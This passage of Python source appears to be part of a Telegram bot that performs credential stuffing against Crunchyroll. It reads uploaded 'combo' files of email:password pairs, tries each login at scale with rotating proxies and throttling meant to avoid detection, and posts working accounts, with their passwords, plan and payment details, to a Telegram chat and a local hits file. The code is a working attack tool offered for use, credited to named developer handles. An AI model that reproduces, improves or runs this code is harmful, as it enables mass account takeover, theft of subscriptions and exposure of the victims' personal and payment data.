            bot.send_message(chat_id, f"❌ Error: {e}")

    def handle_combo_file(message):
        if message.text == "🔙 Back": return go_back(message)
        if message.text == "🛑 Stop Checking": return menu_stop_checking(message)
        
        chat_id = message.chat.id
        if not message.document:
            bot.send_message(chat_id, "❌ Please send a TXT file.")
            return

        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # Auto-detect combos using Regex (Supports mixed files)
            content = downloaded_file.decode('utf-8', errors='ignore')
            combos = re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+:[^\s]+', content)
            combos = list(set(combos)) # Remove duplicates
            
            bot.send_message(chat_id, f"🚀 <b>Starting Check on {len(combos)} accounts...</b>", parse_mode='HTML')
            
            threading.Thread(target=process_combos, args=(chat_id, combos)).start()
            
        except Exception as e:
            bot.send_message(chat_id, f"❌ Error processing file: {e}")

    def process_combos(chat_id, combos):
        data = user_data.get(chat_id)
        dest_id = data['dest']
        proxies = data.get('proxies', [])
        use_proxy = len(proxies) > 0
        
        stats = {'checked': 0, 'premium': 0, 'free': 0, 'bad': 0, 'errors': 0, 'total': len(combos)}
        stats_lock = threading.Lock()
        stop_flag = threading.Event()
        error_combos = [] # Store errors for retry
        user_data[chat_id]['checked_combos'] = set()
        user_data[chat_id]['stop_flag'] = stop_flag
        is_checking = True
        
        # Send initial status message
        
        try:
            status_msg = bot.send_message(chat_id, 
                                          f"🚀 <b>Checking Started...</b>\n\n"
                                          f"<b>Total:</b> {stats['total']}\n"
                                          f"<b>Checked:</b> 0\n"
                                          f"<b>Premium:</b> 0\n"
                                          f"<b>Free:</b> 0\n"
                                          f"<b>Bad:</b> 0\n"
                                          f"<b>Errors:</b> 0", 
                                          parse_mode='HTML')
        except Exception as e:
            bot.send_message(chat_id, f"Error starting check: {e}")
            return

        def status_updater():
            start_time = time.time()
            while is_checking:
                time.sleep(2) # Faster updates (2s is safe)
                try:
                    elapsed = time.time() - start_time
                    cpm = int((stats['checked'] / elapsed) * 60) if elapsed > 0 else 0
                    elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
                    
                    progress = get_progress_bar(stats['checked'], stats['total'])
                    bot.edit_message_text(
                        f"🚀 <b>Checking in Progress...</b>\n\n"
                        f"⏱ <b>Time:</b> {elapsed_str} | ⚡ <b>CPM:</b> {cpm}\n"
                        f"{progress}\n\n"
                        f"<b>Total:</b> {stats['total']}\n"
                        f"<b>Checked:</b> {stats['checked']}\n"
                        f"<b>Premium:</b> {stats['premium']}\n"
                        f"<b>Free:</b> {stats['free']}\n"
                        f"<b>❌ Bad:</b> {stats['bad']}\n"
                        f"<b>⚠️ Errors:</b> {stats['errors']}",
                        chat_id,
                        status_msg.message_id,
                        parse_mode='HTML'
                    )
                except Exception:
                    pass
        
        updater_thread = threading.Thread(target=status_updater)
        updater_thread.start()

        def check_account(combo, is_retry=False):
            if stop_flag.is_set():
                return

            if ':' not in combo:
                with stats_lock: stats['bad'] += 1
                return

            # Create fresh checker instance for each account to rotate User-Agent/Session
            checker = CrunchyrollChecker()
            try:
                # Ensure session is closed properly even if errors occur
                # This fixes the "Without Proxy" error loop
                pass 
                
                email, password = combo.split(':', 1)
                
                # Increased Retries to 7 to reduce Errors
                max_retries = 7 if use_proxy else 3
                for attempt in range(max_retries):
                    if stop_flag.is_set(): return
                    
                    # Select Proxy (Rotate on retry)
                    proxy = random.choice(proxies) if use_proxy else None
                    
                    # Safety delay for No-Proxy mode
                    if not use_proxy:
                        # Optimized for 8000 accounts / 24 hours (Safe Mode)
                        time.sleep(random.uniform(1.0, 2.0)) # Reduced slightly for speed

                    try:
                        result = checker.login(email, password, proxy)
                        
                        if result is not None:
                            # Definitive Result (Hit or Bad)
                            if result:
                                is_premium = result['plan'] != 'Free'
                                if is_premium:
                                    with stats_lock: stats['premium'] += 1
                                else:
                                    with stats_lock: stats['free'] += 1
                                
                                # Send Hit
                                title = "PREMIUM" if is_premium else "FREE"
                                color = "🟢" if is_premium else "🟠"
                                flag = get_flag(result['country']) if len(result['country']) == 2 else "🌍"
                                
                                # New Premium UI Design
                                msg = (
                                    f"<b>✨ 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 {title} ✨</b>\n"
                                    f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                                    f"<b>👤 𝗨𝘀𝗲𝗿:</b> <code>{email}</code>\n"
                                    f"<b>🔑 𝗣𝗮𝘀𝘀:</b> <code>{password}</code>\n"
                                    f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                                    f"<b>💎 𝗣𝗹𝗮𝗻:</b> {result['plan']}\n"
                                    f"<b>{flag} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {result['country']}\n"
                                    f"<b>💰 𝗣𝗿𝗶𝗰𝗲:</b> {result['price']} {result['currency']}\n"
                                    f"<b>💳 𝗣𝗮𝘆𝗺𝗲𝗻𝘁:</b> {result['payment']}\n"
                                    f"<b>⏳ 𝗗𝗮𝘆𝘀:</b> {result['days']}\n"
                                    f"<b>📅 𝗘𝘅𝗽𝗶𝗿𝘆:</b> {result['expiry']}\n"
                                    f"<b>🔄 𝗥𝗲𝗻𝗲𝘄𝗮𝗹:</b> {result['renew']}\n"
                                    f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                                    f"<b>🆔 𝗦𝘂𝗯 𝗜𝗗:</b> {result['sub_id']}\n"
                                    f"<b>📱 𝗗𝗲𝘃𝗶𝗰𝗲𝘀:</b> {result['devices']}\n"
                                    f"<b>📅 𝗖𝗿𝗲𝗮𝘁𝗲𝗱:</b> {result['created']}\n"
                                    f"<b>✅ 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱:</b> {result['verified']}\n"
                                    f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                                    f"<b>👨‍💻 𝗗𝗲𝘃: @F88UF</b>\n"
                                    f"<b>📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @F88UF9844</b>"
                                )
                                hit_markup = types.InlineKeyboardMarkup()
                                hit_markup.add(types.InlineKeyboardButton("📋 Copy Combo", callback_data=f'copy_{email}:{password}'))
                                try: bot.send_message(dest_id, msg, parse_mode='HTML', reply_markup=hit_markup)
                                except: pass
                                
                                # Save Hit Locally
                                try:
                                    with open("hits.txt", "a", encoding="utf-8") as f:
                                        f.write(f"{email}:{password} | Plan: {result['plan']} | Region: {result['country']} | Expiry: {result['expiry']}\n")
                                except: pass
                                
                            elif result is False:
                                with stats_lock: stats['bad'] += 1
                            
                            with stats_lock: 
                                stats['checked'] += 1
                                user_data[chat_id]['checked_combos'].add(combo)
                            return # Done with this account
                        
                        # If result is None (Error), it means Proxy/Connection failed
                        if use_proxy and proxy in proxies and len(proxies) > 10:
                            try:
                                proxies.remove(proxy)
                            except: pass

                        # If No-Proxy failed, short cooldown instead of long pause
                        if not use_proxy and attempt > 1:
                            time.sleep(5) 
                    except:
                        pass
            finally:
                checker.close() # CRITICAL: Closes socket to prevent "Too many open files" error
            
            # If all retries failed
            with stats_lock: 
                stats['errors'] += 1
                stats['checked'] += 1
                user_data[chat_id]['checked_combos'].add(combo)
                if not is_retry:
                    error_combos.append(combo)

        # Force 3 threads if no proxy (24/7 Safe Mode)
        # 3 threads * 15s delay = ~17k checks/day (Perfect for 8000 accs)
        if use_proxy:
            # Max Speed: 1 Account = 1 Proxy logic (up to 1500 threads)
            max_threads = min(1500, len(proxies)) if len(proxies) > 0 else 50
        else:
            max_threads = 10 # Increased for faster proxy-less check
        
        executor = ThreadPoolExecutor(max_workers=max_threads)
        futures = []
        try:
            futures = [executor.submit(check_account, combo) for combo in combos]
            
            # Monitor loop using as_completed for responsiveness
            for future in as_completed(futures):
                if stop_flag.is_set():
                    # Immediate stop
                    executor.shutdown(wait=False)
                    for f in futures: f.cancel()
                    break
                try:
                    future.result()
                except:
                    pass
        finally:
            # Ensure cleanup
            executor.shutdown(wait=False)
            
        # --- RETRY ERRORS ---
        if error_combos and not stop_flag.is_set():
            try:
                bot.send_message(chat_id, f"🔄 <b>Retrying {len(error_combos)} Errors...</b>", parse_mode='HTML')
                
                # Use high threads for retry
                retry_executor = ThreadPoolExecutor(max_workers=max_threads)
                retry_futures = [retry_executor.submit(check_account, combo, True) for combo in error_combos]
                for f in retry_futures:
                    if stop_flag.is_set(): break
                    try: f.result()
                    except: pass
                retry_executor.shutdown(wait=False)
            except: pass
            
        is_checking = False
        updater_thread.join()
        
        # Save remaining combos if stopped
        if stop_flag.is_set():
            all_combos = set(combos)
            checked_combos = user_data[chat_id]['checked_combos']
            remaining = all_combos - checked_combos
            if remaining:
                remaining_filename = f"remaining_{chat_id}.txt"
                with open(remaining_filename, "w", encoding="utf-8") as f:
                    f.write("\n".join(remaining))
                with open(remaining_filename, "rb") as f:
                    bot.send_document(chat_id, f, caption=f"📝 Saved {len(remaining)} unchecked combos.")
                os.remove(remaining_filename)

        # Final status update
        try:
            bot.edit_message_text(
                f"🏁 <b>Checking {'Stopped' if stop_flag.is_set() else 'Completed'}!</b>\n\n"
                f"<b>Total:</b> {stats['total']}\n"
                f"<b>Checked:</b> {stats['checked']}\n"
                f"<b>Premium:</b> {stats['premium']}\n"
                f"<b>Free:</b> {stats['free']}\n"
                f"<b>Bad:</b> {stats['bad']}\n"
                f"<b>Errors:</b> {stats['errors']}",
                chat_id,
                status_msg.message_id,
                parse_mode='HTML'
            )
        except:
            pass
            
        bot.send_message(chat_id, f"🏁 <b>Checking {'Stopped' if stop_flag.is_set() else 'Completed'}!</b>", parse_mode='HTML')

    print("🤖 Bot is running... (UI UPDATED)")
    
    # Auto-restart loop
    while True:
        try:
            bot.polling(non_stop=True, interval=0, timeout=60)
        except ApiTelegramException as e:
            if e.error_code == 409:
                print("❌ CRITICAL: Another bot instance is running!")
                print("👉 Please CLOSE all other CMD/Terminal windows.")
                print("⏳ Retrying in 30 seconds...")
                time.sleep(30)
            else:
                print(f"⚠️ API Error: {e}")
                time.sleep(5)
        except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout, RemoteDisconnected) as e:
            # Silent reconnect for network issues
            time.sleep(1)
            continue
        except Exception as e:
            print(f"⚠️ Bot Error: {e}. Restarting...")
            time.sleep(5)

if __name__ == "__main__":
    cleanup_old_files()
    token = get_token()
    try:
        start_bot(token)
    except Exception as e:
        print(f"Error: {e}")
        input("Press Enter to exit...")